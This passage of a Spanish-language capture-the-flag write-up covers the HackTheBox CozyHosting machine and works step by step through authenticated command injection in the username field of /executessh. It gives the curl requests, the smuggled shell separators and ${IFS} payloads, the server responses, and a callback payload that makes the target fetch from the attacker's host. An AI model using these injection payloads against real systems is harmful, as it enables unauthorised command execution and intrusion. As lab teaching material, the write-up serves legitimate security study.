  -o loot/executessh_test_username_pipe.txt

cat loot/executessh_test_username_pipe.txt

Probar sustitución de espacio mediante variable de shell, sin ejecutar acción externa:

curl -sS -i -X POST http://cozyhosting.htb/executessh \
  -H 'Cookie: JSESSIONID=69EF63EAAED85BD239B2A03AFE4B7D29' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'host=127.0.0.1' \
  --data-urlencode 'username=test${IFS}marcador' \
  -o loot/executessh_test_username_ifs.txt

cat loot/executessh_test_username_ifs.txt

Comparar contra la respuesta base:

diff -u loot/executessh_test_127001.txt loot/executessh_test_username_puntoycoma.txt

diff -u loot/executessh_test_127001.txt loot/executessh_test_username_pipe.txt

diff -u loot/executessh_test_127001.txt loot/executessh_test_username_ifs.txt

## Comprobaciones

Debe comprobarse si caracteres como punto y coma o pipe son rechazados por validación.

Debe comprobarse si la respuesta cambia antes de llegar a SSH.

Debe comprobarse si el backend devuelve un error nuevo, distinto de Host key verification failed.

Debe comprobarse si la aplicación solo bloquea espacios literales o si también controla sustituciones como ${IFS}.

Debe comprobarse si el campo username queda confirmado como entrada peligrosa o si la validación lo neutraliza.

## Notas para el informe

Las pruebas benignas han demostrado que la funcionalidad /executessh intenta conectar por SSH desde el backend.

La validación de host es más estricta y rechaza valores con formato inválido.

La validación de username rechaza espacios, pero permite usernames normales y continúa hasta SSH.

La siguiente verificación debe centrarse en el tratamiento de caracteres especiales dentro de username.

Cadena actual:

panel autenticado
→ formulario /executessh
→ operación SSH real
→ host validado
→ username sin espacios aceptado
→ análisis de caracteres especiales pendiente

Hallazgo dominante:

username es el campo controlable con mayor interés técnico

Siguiente paso único:

validar si username permite caracteres especiales sin espacios y observar si cambia el error reflejado.

## Ejecutamos:

───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: loot/executessh_test_username_puntoycoma.txt
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ HTTP/1.1 302
   2   │ Server: nginx/1.18.0 (Ubuntu)
   3   │ Date: Sat, 02 May 2026 11:55:41 GMT
   4   │ Content-Length: 0
   5   │ Location: http://cozyhosting.htb/admin?error=ssh: Could not resolve hostname test: Temporary failure in name resolution/bin/bash: line 1: @127.0.0.1: command not found
   6   │ Connection: keep-alive
   7   │ X-Content-Type-Options: nosniff
   8   │ X-XSS-Protection: 0
   9   │ Cache-Control: no-cache, no-store, max-age=0, must-revalidate
  10   │ Pragma: no-cache
  11   │ Expires: 0
  12   │ X-Frame-Options: DENY
  13   │
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: loot/executessh_test_username_pipe.txt
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ HTTP/1.1 302
   2   │ Server: nginx/1.18.0 (Ubuntu)
   3   │ Date: Sat, 02 May 2026 11:55:41 GMT
   4   │ Content-Length: 0
   5   │ Location: http://cozyhosting.htb/admin?error=/bin/bash: line 1: @127.0.0.1: command not foundssh: Could not resolve hostname test: Temporary failure in name resolution
   6   │ Connection: keep-alive
   7   │ X-Content-Type-Options: nosniff
   8   │ X-XSS-Protection: 0
   9   │ Cache-Control: no-cache, no-store, max-age=0, must-revalidate
  10   │ Pragma: no-cache
  11   │ Expires: 0
  12   │ X-Frame-Options: DENY
  13   │
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: loot/executessh_test_username_ifs.txt
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ HTTP/1.1 302
   2   │ Server: nginx/1.18.0 (Ubuntu)
   3   │ Date: Sat, 02 May 2026 11:55:41 GMT
   4   │ Content-Length: 0
   5   │ Location: http://cozyhosting.htb/admin?error=ssh: Could not resolve hostname test: Temporary failure in name resolution
   6   │ Connection: keep-alive
   7   │ X-Content-Type-Options: nosniff
   8   │ X-XSS-Protection: 0
   9   │ Cache-Control: no-cache, no-store, max-age=0, must-revalidate
  10   │ Pragma: no-cache
  11   │ Expires: 0
  12   │ X-Frame-Options: DENY
  13   │
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
--- loot/executessh_test_127001.txt	2026-05-02 13:51:41.440767392 +0200
+++ loot/executessh_test_username_puntoycoma.txt	2026-05-02 13:55:41.641049110 +0200
@@ -1,8 +1,8 @@
 HTTP/1.1 302
 Server: nginx/1.18.0 (Ubuntu)
-Date: Sat, 02 May 2026 11:51:41 GMT
+Date: Sat, 02 May 2026 11:55:41 GMT
 Content-Length: 0
-Location: http://cozyhosting.htb/admin?error=Host key verification failed.
+Location: http://cozyhosting.htb/admin?error=ssh: Could not resolve hostname test: Temporary failure in name resolution/bin/bash: line 1: @127.0.0.1: command not found
 Connection: keep-alive
 X-Content-Type-Options: nosniff
 X-XSS-Protection: 0
--- loot/executessh_test_127001.txt	2026-05-02 13:51:41.440767392 +0200
+++ loot/executessh_test_username_pipe.txt	2026-05-02 13:55:41.774382449 +0200
@@ -1,8 +1,8 @@
 HTTP/1.1 302
 Server: nginx/1.18.0 (Ubuntu)
-Date: Sat, 02 May 2026 11:51:41 GMT
+Date: Sat, 02 May 2026 11:55:41 GMT
 Content-Length: 0
-Location: http://cozyhosting.htb/admin?error=Host key verification failed.
+Location: http://cozyhosting.htb/admin?error=/bin/bash: line 1: @127.0.0.1: command not foundssh: Could not resolve hostname test: Temporary failure in name resolution
 Connection: keep-alive
 X-Content-Type-Options: nosniff
 X-XSS-Protection: 0
--- loot/executessh_test_127001.txt	2026-05-02 13:51:41.440767392 +0200
+++ loot/executessh_test_username_ifs.txt	2026-05-02 13:55:41.894382455 +0200
@@ -1,8 +1,8 @@
 HTTP/1.1 302
 Server: nginx/1.18.0 (Ubuntu)
-Date: Sat, 02 May 2026 11:51:41 GMT
+Date: Sat, 02 May 2026 11:55:41 GMT
 Content-Length: 0
-Location: http://cozyhosting.htb/admin?error=Host key verification failed.
+Location: http://cozyhosting.htb/admin?error=ssh: Could not resolve hostname test: Temporary failure in name resolution
 Connection: keep-alive
 X-Content-Type-Options: nosniff
 X-XSS-Protection: 0

## Objetivo

Analizar las pruebas con caracteres especiales en el campo username de /executessh y determinar si existe evidencia suficiente de inyección de comandos en la funcionalidad autenticada de CozyHosting.

## Hechos verificados

El campo username acepta caracteres especiales como punto y coma:

test;

La respuesta cambia de forma significativa respecto a la prueba base.

Con username terminado en punto y coma, la aplicación devuelve en la cabecera Location:

ssh: Could not resolve hostname test: Temporary failure in name resolution/bin/bash: line 1: @127.0.0.1: command not found

El campo username también acepta el carácter pipe:

test|

La respuesta incluye de nuevo una salida generada por bash:

/bin/bash: line 1: @127.0.0.1: command not found

La aparición explícita de:

/bin/bash: line 1

confirma que la entrada controlada por el usuario llega a una shell del sistema.

La prueba con ${IFS} no devuelve error de espacio en blanco. En cambio, cambia el comportamiento hacia:

ssh: Could not resolve hostname test: Temporary failure in name resolution

Esto indica que la aplicación bloquea espacios literales en username, pero no necesariamente todas las formas de separación interpretables por shell.

Las respuestas siguen devolviéndose mediante HTTP 302 hacia /admin, usando el parámetro error como canal de observación.

## Supuestos

El backend construye una cadena de ejecución relacionada con ssh usando los valores username y host.

El campo username se inserta en una posición anterior al separador @host dentro de una llamada similar a:

ssh usuario@host

La validación del campo username impide espacios literales, pero no bloquea caracteres de control de shell como ; o |.

La aparición de errores de /bin/bash demuestra que el backend no invoca ssh como llamada segura con argumentos separados, sino mediante una cadena interpretada por shell.

El campo username queda confirmado como punto de entrada vulnerable.

## Método

La lectura correcta de esta fase es:

formulario autenticado
→ endpoint /executessh
→ operación SSH real
→ username acepta caracteres especiales
→ aparece error de /bin/bash
→ inyección de comandos confirmada
→ siguiente paso: validar ejecución controlada y mínima antes de cualquier acción posterior

En este punto ya no se está ante una simple hipótesis.

La evidencia observada permite afirmar que existe una inyección de comandos en el campo username.

Aun así, la metodología correcta exige una validación mínima, controlada y trazable antes de pasar a fases más invasivas.

## Respuesta

El hallazgo dominante es la inyección de comandos en el parámetro username del endpoint /executessh.

La prueba con punto y coma y pipe demuestra que el valor de username no se trata únicamente como texto, sino que modifica la línea interpretada por /bin/bash.

La rama principal sigue siendo:

WEB-AUTH / PANEL

La fase actual cambia de naturaleza:

panel autenticado
→ flujo backend SSH
→ validación de entrada
→ command injection confirmada

La rama secundaria sigue siendo:

SSH pendiente de credenciales

El siguiente paso único debe ser una validación controlada de ejecución mínima, sin buscar todavía shell interactiva ni escalada. La finalidad de esa validación es confirmar qué usuario del sistema ejecuta el backend y dejar evidencia clara del contexto.

## Comandos

Preparar un fichero para guardar la siguiente prueba:

mkdir -p loot

Validar ejecución mínima con un comando no destructivo:

curl -sS -i -X POST http://cozyhosting.htb/executessh \
  -H 'Cookie: JSESSIONID=69EF63EAAED85BD239B2A03AFE4B7D29' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'host=127.0.0.1' \
  --data-urlencode 'username=test;id' \
  -o loot/executessh_validacion_id.txt

Ver la respuesta:

cat loot/executessh_validacion_id.txt

Validar el directorio de trabajo con un comando no destructivo:

curl -sS -i -X POST http://cozyhosting.htb/executessh \
  -H 'Cookie: JSESSIONID=69EF63EAAED85BD239B2A03AFE4B7D29' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'host=127.0.0.1' \
  --data-urlencode 'username=test;pwd' \
  -o loot/executessh_validacion_pwd.txt

Ver la respuesta:

cat loot/executessh_validacion_pwd.txt

Comparar contra la respuesta de punto y coma:

diff -u loot/executessh_test_username_puntoycoma.txt loot/executessh_validacion_id.txt

diff -u loot/executessh_test_username_puntoycoma.txt loot/executessh_validacion_pwd.txt

## Comprobaciones

Debe comprobarse si la salida de id aparece reflejada en la cabecera Location.

Debe comprobarse qué usuario ejecuta el backend.

Debe comprobarse si aparece un usuario de aplicación, por ejemplo app, www-data u otro usuario local.

Debe comprobarse si la salida de pwd aparece reflejada.

Debe comprobarse si el contexto de ejecución corresponde al directorio de la aplicación.

Debe comprobarse si la aplicación concatena stdout y stderr dentro del parámetro error.

Debe comprobarse si la ejecución queda suficientemente demostrada sin necesidad de pasar todavía a una shell interactiva.

## Notas para el informe

La inyección de comandos queda confirmada por la aparición de errores de /bin/bash en la respuesta de la aplicación.

El campo vulnerable es username dentro del formulario autenticado de inclusión de host en parcheo automático.

El campo host está validado de forma más estricta, mientras que username bloquea espacios pero permite caracteres de control.

La exposición previa de Actuator fue la vía de acceso al panel. El fallo posterior se encuentra en una funcionalidad autenticada del panel.

Cadena actual:

Spring Boot Actuator expuesto
→ /actuator/sessions filtra sesión de kanderson
→ acceso a /admin
→ formulario /executessh
→ operación SSH real
→ username llega a /bin/bash
→ command injection confirmada

Hallazgo dominante:

inyección de comandos autenticada en username

Siguiente paso único:

validar ejecución mínima con comandos no destructivos para identificar usuario y contexto de ejecución.

## Ejecutamos:

───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: loot/executessh_validacion_id.txt
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ HTTP/1.1 302
   2   │ Server: nginx/1.18.0 (Ubuntu)
   3   │ Date: Sat, 02 May 2026 11:58:52 GMT
   4   │ Content-Length: 0
   5   │ Location: http://cozyhosting.htb/admin?error=ssh: Could not resolve hostname test: Temporary failure in name resolution/bin/bash: line 1: id@127.0.0.1: command not found
   6   │ Connection: keep-alive
   7   │ X-Content-Type-Options: nosniff
   8   │ X-XSS-Protection: 0
   9   │ Cache-Control: no-cache, no-store, max-age=0, must-revalidate
  10   │ Pragma: no-cache
  11   │ Expires: 0
  12   │ X-Frame-Options: DENY
  13   │
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: loot/executessh_validacion_pwd.txt
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ HTTP/1.1 302
   2   │ Server: nginx/1.18.0 (Ubuntu)
   3   │ Date: Sat, 02 May 2026 11:58:52 GMT
   4   │ Content-Length: 0
   5   │ Location: http://cozyhosting.htb/admin?error=ssh: Could not resolve hostname test: Temporary failure in name resolution/bin/bash: line 1: pwd@127.0.0.1: command not found
   6   │ Connection: keep-alive
   7   │ X-Content-Type-Options: nosniff
   8   │ X-XSS-Protection: 0
   9   │ Cache-Control: no-cache, no-store, max-age=0, must-revalidate
  10   │ Pragma: no-cache
  11   │ Expires: 0
  12   │ X-Frame-Options: DENY
  13   │
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
--- loot/executessh_test_username_puntoycoma.txt	2026-05-02 13:55:41.641049110 +0200
+++ loot/executessh_validacion_id.txt	2026-05-02 13:58:52.711057259 +0200
@@ -1,8 +1,8 @@
 HTTP/1.1 302
 Server: nginx/1.18.0 (Ubuntu)
-Date: Sat, 02 May 2026 11:55:41 GMT
+Date: Sat, 02 May 2026 11:58:52 GMT
 Content-Length: 0
-Location: http://cozyhosting.htb/admin?error=ssh: Could not resolve hostname test: Temporary failure in name resolution/bin/bash: line 1: @127.0.0.1: command not found
+Location: http://cozyhosting.htb/admin?error=ssh: Could not resolve hostname test: Temporary failure in name resolution/bin/bash: line 1: id@127.0.0.1: command not found
 Connection: keep-alive
 X-Content-Type-Options: nosniff
 X-XSS-Protection: 0
--- loot/executessh_test_username_puntoycoma.txt	2026-05-02 13:55:41.641049110 +0200
+++ loot/executessh_validacion_pwd.txt	2026-05-02 13:58:52.837723931 +0200
@@ -1,8 +1,8 @@
 HTTP/1.1 302
 Server: nginx/1.18.0 (Ubuntu)
-Date: Sat, 02 May 2026 11:55:41 GMT
+Date: Sat, 02 May 2026 11:58:52 GMT
 Content-Length: 0
-Location: http://cozyhosting.htb/admin?error=ssh: Could not resolve hostname test: Temporary failure in name resolution/bin/bash: line 1: @127.0.0.1: command not found
+Location: http://cozyhosting.htb/admin?error=ssh: Could not resolve hostname test: Temporary failure in name resolution/bin/bash: line 1: pwd@127.0.0.1: command not found
 Connection: keep-alive
 X-Content-Type-Options: nosniff
 X-XSS-Protection: 0

## Objetivo

Analizar por qué las pruebas `test;id` y `test;pwd` no han mostrado todavía la salida esperada de los comandos y ajustar la interpretación de la inyección en `/executessh`.

## Hechos verificados

La prueba con `username=test;id` devuelve:

Location: http://cozyhosting.htb/admin?error=ssh: Could not resolve hostname test: Temporary failure in name resolution/bin/bash: line 1: id@127.0.0.1: command not found

La prueba con `username=test;pwd` devuelve:

Location: http://cozyhosting.htb/admin?error=ssh: Could not resolve hostname test: Temporary failure in name resolution/bin/bash: line 1: pwd@127.0.0.1: command not found

La aplicación sigue ejecutando una cadena interpretada por `/bin/bash`.

El carácter `;` sigue alterando la estructura del comando.

Sin embargo, `id` y `pwd` no se han ejecutado como comandos limpios. Han quedado unidos al sufijo `@127.0.0.1`.

La diferencia principal respecto a la hipótesis anterior es esta:

test;id

no se interpreta como:

ssh test
id

sino que termina generando una segunda parte parecida a:

id@127.0.0.1

Por eso bash responde:

id@127.0.0.1: command not found

Lo mismo ocurre con:

pwd@127.0.0.1: command not found

## Supuestos

El backend probablemente construye una cadena similar a:

ssh usuario@host

Al inyectar en `username`, el valor queda colocado justo antes de `@host`.

Por eso cualquier comando añadido después del separador queda contaminado por el sufijo:

@127.0.0.1

La inyección existe, pero todavía falta neutralizar o separar correctamente la parte final de la cadena para conseguir una validación limpia.

## Método

La lectura correcta de esta fase es:

username acepta separadores de shell
→ bash interpreta la entrada
→ la inyección está confirmada
→ el comando añadido queda pegado a @host
→ id y pwd no se ejecutan limpios
→ siguiente paso: validar ejecución mínima teniendo en cuenta el sufijo @host

No debe interpretarse esta salida como fallo de la inyección.

La salida demuestra precisamente que la inyección existe, pero también muestra que la posición del parámetro dentro del comando importa.

El problema actual no es “no hay command injection”.

El problema actual es:

la inyección ocurre antes de @host y hay que controlar cómo queda el resto de la línea.

## Respuesta

El hallazgo dominante sigue siendo la inyección de comandos en `username`.

La evidencia más importante es la aparición de:

/bin/bash: line 1

y de comandos derivados de la entrada del usuario:

id@127.0.0.1
pwd@127.0.0.1

Esto confirma que el valor de `username` llega a una shell, pero también confirma que el comando final queda construido con el patrón:

<username>@<host>

La prueba de `id` y `pwd` no ha devuelto la salida esperada porque el sufijo `@127.0.0.1` se ha pegado al comando.

La siguiente verificación corta debe comprobar si se puede cerrar la parte inyectada y anular el resto de la línea de forma controlada, usando únicamente comandos no destructivos.

## Comandos

Probar si un comentario de shell neutraliza el sufijo `@host`:

curl -sS -i -X POST http://cozyhosting.htb/executessh \
  -H 'Cookie: JSESSIONID=69EF63EAAED85BD239B2A03AFE4B7D29' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'host=127.0.0.1' \
  --data-urlencode 'username=test;id;' \
  -o loot/executessh_validacion_id_separado.txt

cat loot/executessh_validacion_id_separado.txt

Probar una separación equivalente con `pwd`:

curl -sS -i -X POST http://cozyhosting.htb/executessh \
  -H 'Cookie: JSESSIONID=69EF63EAAED85BD239B2A03AFE4B7D29' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'host=127.0.0.1' \
  --data-urlencode 'username=test;pwd;' \
  -o loot/executessh_validacion_pwd_separado.txt

cat loot/executessh_validacion_pwd_separado.txt

Probar con comentario final para cortar el resto de la línea:

curl -sS -i -X POST http://cozyhosting.htb/executessh \
  -H 'Cookie: JSESSIONID=69EF63EAAED85BD239B2A03AFE4B7D29' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'host=127.0.0.1' \
  --data-urlencode 'username=test;id;#' \
  -o loot/executessh_validacion_id_comentario.txt

cat loot/executessh_validacion_id_comentario.txt

Comparar con la prueba anterior:

diff -u loot/executessh_validacion_id.txt loot/executessh_validacion_id_separado.txt

diff -u loot/executessh_validacion_id.txt loot/executessh_validacion_id_comentario.txt

## Comprobaciones

Debe comprobarse si aparece una salida de tipo:

uid=...

Debe comprobarse si aparece el usuario efectivo del proceso backend.

Debe comprobarse si el sufijo `@127.0.0.1` deja de contaminar el comando inyectado.

Debe comprobarse si la salida del comando aparece reflejada en el parámetro `error` de la cabecera `Location`.

Debe comprobarse si el comentario `#` es aceptado o filtrado por la aplicación.

Debe comprobarse si la ejecución queda validada con comandos no destructivos antes de plantear una fase posterior.

## Notas para el informe

La prueba anterior no invalida la inyección. Al contrario, permite entender mejor la posición exacta del parámetro vulnerable dentro del comando construido por el backend.

La aplicación parece construir una llamada SSH con el patrón:

ssh <username>@<host>

Al controlar `username`, se puede alterar la línea interpretada por bash, pero el sufijo `@host` sigue formando parte de la línea si no se neutraliza.

La lección reutilizable es importante: en command injection no basta con confirmar que un separador funciona. También hay que entender dónde cae exactamente la entrada dentro del comando final.

Cadena actual:

formulario autenticado
→ `/executessh`
→ `username` controlable
→ bash interpreta separadores
→ comandos contaminados por `@host`
→ pendiente neutralizar sufijo y validar ejecución limpia

Hallazgo dominante:

inyección confirmada, pero con sufijo `@host` afectando al comando inyectado

Siguiente paso único:

validar ejecución limpia de `id` neutralizando el resto de la línea.

## Ejecutamos:

───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: loot/executessh_validacion_id_separado.txt
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ HTTP/1.1 302
   2   │ Server: nginx/1.18.0 (Ubuntu)
   3   │ Date: Sat, 02 May 2026 12:01:30 GMT
   4   │ Content-Length: 0
   5   │ Location: http://cozyhosting.htb/admin?error=ssh: Could not resolve hostname test: Temporary failure in name resolution/bin/bash: line 1: @127.0.0.1: command not found
   6   │ Connection: keep-alive
   7   │ X-Content-Type-Options: nosniff
   8   │ X-XSS-Protection: 0
   9   │ Cache-Control: no-cache, no-store, max-age=0, must-revalidate
  10   │ Pragma: no-cache
  11   │ Expires: 0
  12   │ X-Frame-Options: DENY
  13   │
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: loot/executessh_validacion_pwd_separado.txt
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ HTTP/1.1 302
   2   │ Server: nginx/1.18.0 (Ubuntu)
   3   │ Date: Sat, 02 May 2026 12:01:30 GMT
   4   │ Content-Length: 0
   5   │ Location: http://cozyhosting.htb/admin?error=ssh: Could not resolve hostname test: Temporary failure in name resolution/bin/bash: line 1: @127.0.0.1: command not found
   6   │ Connection: keep-alive
   7   │ X-Content-Type-Options: nosniff
   8   │ X-XSS-Protection: 0
   9   │ Cache-Control: no-cache, no-store, max-age=0, must-revalidate
  10   │ Pragma: no-cache
  11   │ Expires: 0
  12   │ X-Frame-Options: DENY
  13   │
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: loot/executessh_validacion_id_comentario.txt
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ HTTP/1.1 302
   2   │ Server: nginx/1.18.0 (Ubuntu)
   3   │ Date: Sat, 02 May 2026 12:01:30 GMT
   4   │ Content-Length: 0
   5   │ Location: http://cozyhosting.htb/admin?error=ssh: Could not resolve hostname test: Temporary failure in name resolution
   6   │ Connection: keep-alive
   7   │ X-Content-Type-Options: nosniff
   8   │ X-XSS-Protection: 0
   9   │ Cache-Control: no-cache, no-store, max-age=0, must-revalidate
  10   │ Pragma: no-cache
  11   │ Expires: 0
  12   │ X-Frame-Options: DENY
  13   │
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
--- loot/executessh_validacion_id.txt	2026-05-02 13:58:52.711057259 +0200
+++ loot/executessh_validacion_id_separado.txt	2026-05-02 14:01:30.941064003 +0200
@@ -1,8 +1,8 @@
 HTTP/1.1 302
 Server: nginx/1.18.0 (Ubuntu)
-Date: Sat, 02 May 2026 11:58:52 GMT
+Date: Sat, 02 May 2026 12:01:30 GMT
 Content-Length: 0
-Location: http://cozyhosting.htb/admin?error=ssh: Could not resolve hostname test: Temporary failure in name resolution/bin/bash: line 1: id@127.0.0.1: command not found
+Location: http://cozyhosting.htb/admin?error=ssh: Could not resolve hostname test: Temporary failure in name resolution/bin/bash: line 1: @127.0.0.1: command not found
 Connection: keep-alive
 X-Content-Type-Options: nosniff
 X-XSS-Protection: 0
--- loot/executessh_validacion_id.txt	2026-05-02 13:58:52.711057259 +0200
+++ loot/executessh_validacion_id_comentario.txt	2026-05-02 14:01:31.201064014 +0200
@@ -1,8 +1,8 @@
 HTTP/1.1 302
 Server: nginx/1.18.0 (Ubuntu)
-Date: Sat, 02 May 2026 11:58:52 GMT
+Date: Sat, 02 May 2026 12:01:30 GMT
 Content-Length: 0
-Location: http://cozyhosting.htb/admin?error=ssh: Could not resolve hostname test: Temporary failure in name resolution/bin/bash: line 1: id@127.0.0.1: command not found
+Location: http://cozyhosting.htb/admin?error=ssh: Could not resolve hostname test: Temporary failure in name resolution
 Connection: keep-alive
 X-Content-Type-Options: nosniff
 X-XSS-Protection: 0

## La salida confirma que # corta el sufijo @127.0.0.1, pero la salida de id no queda reflejada. El siguiente paso práctico es validar callback externo con curl desde el objetivo.

# Vamos a dejar un servidor HTTP en escucha por el puerto 7000:
❯ ip -4 addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}'

python3 -m http.server 7000
10.10.15.26
Serving HTTP on 0.0.0.0 port 7000 (http://0.0.0.0:7000/) ...

# Y desde otra terminal, lanzamos la prueba de callback externo:

❯ cd /home/r4mon/pentest/targets/HTB/easy/CozyHosting

curl -sS -i -X POST http://cozyhosting.htb/executessh \
  -H 'Cookie: JSESSIONID=69EF63EAAED85BD239B2A03AFE4B7D29' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'host=127.0.0.1' \
  --data-urlencode 'username=test;curl${IFS}http://10.10.15.26:7000;#' \
  -o loot/executessh_callback_curl.txt

cat loot/executessh_callback_curl.txt
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: loot/executessh_callback_curl.txt
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ HTTP/1.1 302
   2   │ Server: nginx/1.18.0 (Ubuntu)
   3   │ Date: Sat, 02 May 2026 14:56:55 GMT
   4   │ Content-Length: 0
   5   │ Location: http://cozyhosting.htb/admin?error=ssh: Could not resolve hostname test: Temporary failure in name resolution  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
       │                  Dload  Upload   Total   Spent    Left  Speed  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   378  100   378    0     0   3974      0 --:--:-- --:--:-- --:--:--  4
       │ 021
   6   │ Connection: keep-alive
   7   │ X-Content-Type-Options: nosniff
   8   │ X-XSS-Protection: 0
   9   │ Cache-Control: no-cache, no-store, max-age=0, must-revalidate
  10   │ Pragma: no-cache
  11   │ Expires: 0
  12   │ X-Frame-Options: DENY
  13   │
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
# En el servidor HTTP, vemos la petición de callback:

10.129.37.233 - - [02/May/2026 16:56:55] "GET / HTTP/1.1" 200 -

## Objetivo

Analizar la validación de callback externo desde `/executessh` y cerrar la confirmación práctica de ejecución remota controlada en CozyHosting.

## Hechos verificados

El servidor HTTP local en el puerto `7000` recibió una petición entrante desde la máquina objetivo:

10.129.37.233 - - [02/May/2026 16:56:55] "GET / HTTP/1.1" 200 -

La petición fue recibida en el servidor levantado en la máquina atacante sobre la interfaz VPN.

La IP local usada para el callback fue:

10.10.15.26

La petición enviada al endpoint `/executessh` incluyó en el campo `username` una llamada a `curl` usando `${IFS}` para evitar espacios literales:

test;curl${IFS}http://10.10.15.26:7000;#

La respuesta HTTP del objetivo volvió a ser una redirección `302` hacia `/admin`.

La cabecera `Location` conserva el error previo de SSH:

ssh: Could not resolve hostname test: Temporary failure in name resolution

La misma respuesta también incluye salida propia de `curl`, lo que confirma que el comando fue interpretado y ejecutado por el backend.

## Supuestos

La ejecución del comando `curl` desde el objetivo queda confirmada por el callback recibido.

El parámetro `username` permite ejecutar comandos externos siempre que se respeten las restricciones observadas:

- no usar espacios literales;
- usar separadores de shell;
- neutralizar el sufijo `@host` con comentario;
- usar `${IFS}` como sustituto de espacio cuando sea necesario.

El contexto exacto del usuario del proceso aún no está confirmado por salida directa tipo `id`, pero la ejecución remota mínima ya está demostrada.

La salida de `curl` mezclada en la cabecera `Location` confirma que stdout/stderr del proceso pueden reflejarse parcialmente en el parámetro `error`.

## Método

La lectura correcta de esta fase es:

sesión autenticada reutilizada
→ acceso a `/admin`
→ formulario `/executessh`
→ inyección en `username`
→ validación de callback externo
→ ejecución remota confirmada
→ siguiente fase: obtención de shell por el operador y posterior enumeración local

No queda pendiente demostrar si el backend ejecuta comandos: ya está demostrado.

Lo pendiente ahora es confirmar el contexto real de ejecución una vez exista una shell o una salida fiable de sistema.

## Respuesta

El hallazgo dominante queda confirmado:

command injection autenticada en el parámetro `username` del endpoint `/executessh`.

La prueba de callback externo es más fuerte que una simple diferencia de errores, porque demuestra que la máquina objetivo inició una conexión saliente hacia la máquina atacante.

La rama principal activa sigue siendo:

WEB-AUTH / PANEL

La fase de validación web queda suficientemente cerrada.

El siguiente tramo ya pertenece a ejecución práctica del operador en laboratorio. Una vez obtenido acceso interactivo, la prioridad será documentar:

- usuario efectivo;
- hostname;
- directorio de trabajo;
- ubicación de la aplicación;
- presencia del fichero `.jar`;
- credenciales o configuración interna;
- posibles rutas de movimiento lateral.

## Comandos

No se añaden nuevos comandos de explotación en esta nota.

## Comprobaciones

Debe quedar anotado que el callback externo fue recibido desde:

10.129.37.233

Debe quedar anotado que el callback llegó al servidor local en:

10.10.15.26:7000

Debe quedar anotado que el payload usado evitó espacios mediante:

${IFS}

Debe quedar anotado que el comentario final `#` evitó que el sufijo `@127.0.0.1` contaminara el resto de la línea.

Debe quedar anotado que la ejecución remota queda validada por una conexión HTTP entrante observable.

#### Foothold - De sesión filtrada a shell como usuario `app`

La explotación inicial de CozyHosting no nace de credenciales válidas, sino de una sesión activa expuesta por Spring Boot Actuator.

La sesión filtrada permite entrar al dashboard como `K. Anderson`.

Dentro del panel, la funcionalidad **“Include host into automatic patching”** envía datos a `/executessh`.

El backend intenta ejecutar una operación SSH usando los valores `username` y `host`.

